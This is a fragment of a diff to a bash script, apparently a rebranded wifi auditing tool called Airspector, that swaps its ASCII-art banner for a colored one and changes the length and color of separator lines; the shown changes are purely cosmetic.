 	eval "sudo ./distro_info.sh --ascii_distro darkos"
 	
 	sleep 2
+	
 }
 
 #Generate the frames of the animated ascii art 
 function Ascii_art() {
 
 	debug_print
-	echo -e "${yellow_color} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣗⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⡟⠹⣿⣿⣿⣿⣿⣷⡷⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠏⠀⠀⠹⣿⣿⣿⣿⣿⣿⣞⡄⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣮⡄⠀⠀⠀⠀
-⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
-⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣄⠀⠀
-⠀⣰⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⡆⠀⠀⠰⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣯⣆⠀
-⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
-⠀⠈⠻⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⡿⠋⠀
-⠀⠀⠀⠘⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠋⠀⠀⠀"
+	echo -e "
+${pink_color} ⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${red_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⠋⡆⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${cyan_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⢀⣤⢛⠛⣠⣿⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${red_color}  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⠟⣡⠊⣠⣾⣿⠃⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${green_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣯⣿⠀⠊⣤⣿⣿⣿⠃⣴⣧⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${red_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⡟⣠⣶⣿⣿⣿⢋⣤⠿⠛⠉⢁⣭⣽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${green_color}    ⠀⠀⠀⠀⠀⠀ ⠀⣠⠖⡭⢉⣿⣯⣿⣯⣿⣿⣿⣟⣧⠛⢉⣤⣶⣾⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀
+${yellow_color}⠀⠀⠀⠀⠀⠀⠀⠀⣴⣫⠓⢱⣯⣿⢿⠋⠛⢛⠟⠯⠶⢟⣿⣯⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${cyan_color}⠀⠀⠀⠀⠀⠀⢀⡮⢁⣴⣿⣿⣿⠖⣠⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠛⠛⢿⣶⣄⠀⠀⠀⠀⠀⠀⠀
+${red_color}⠀⠀⠀⢀⣤⣷⣿⣿⠿⢛⣭⠒⠉⠀⠀⠀⣀⣀⣄⣤⣤⣴⣶⣶⣶⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
+${yellow_color}⠀⢀⣶⠏⠟⠝⠉⢀⣤⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀			${red_color}[${green_color}*${red_color}]${cyan_color}Airspector⠀Wifi exploitation tool⠀⠀⠀⠀⠀⠀⠀
+${pink_color}⢴⣯⣤⣶⣿⣿⣿⣿⣿⡿⣿⣯⠉⠉⠉⠉⠀⠀⠀⠈⣿⡀⣟⣿⣿⢿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${cyan_color}⠀⠀⠀⠉⠛⣿⣧⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⣿⣿⣯⣿⣦⡀⠀⠉⠻⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${red_color}⠀⠀⠀⠀⠀⠀⠉⢿⣮⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⣯⠉⠉⠛⢿⣿⣷⣄⠀⠈⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀
+${yellow_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⠀⠀⠀⠀⠀⠀⠀⢀⢡⠃⣾⣿⣿⣦⠀⠀⠀⠙⢿⣿⣤⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀
+${green_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢋⡟⢠⣿⣿⣿⠋⢿⣄⠀⠀⠀⠈⡄⠙⣶⣈⡄⠀⠀⠀⠀⠀⠀
+${pink_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠚⢲⣿⠀⣾⣿⣿⠁⠀⠀⠉⢷⡀⠀⠀⣇⠀⠀⠈⠻⡀⠀⠀⠀⠀⠀
+${red_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⣀⣿⡏⠀⣿⡿⠀⠀⠀⠀⠀⠀⠙⣦⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${yellow_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠿⣧⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${green_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
 	
 	
 }
@@ -17045,7 +17463,7 @@ function print_simple_separator() {
 
 	debug_print
 
-	echo_blue "▱▱▱▱▱▱▱▱"
+	echo_blue "▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱"
 }
 
 #Print a large separator
@@ -17053,7 +17471,7 @@ function print_large_separator() {
 
 	debug_print
 
-	echo_green "▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱"
+	echo_red "▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱"
 }
 
 #Add the PoT prefix on printed strings if PoT mark is found
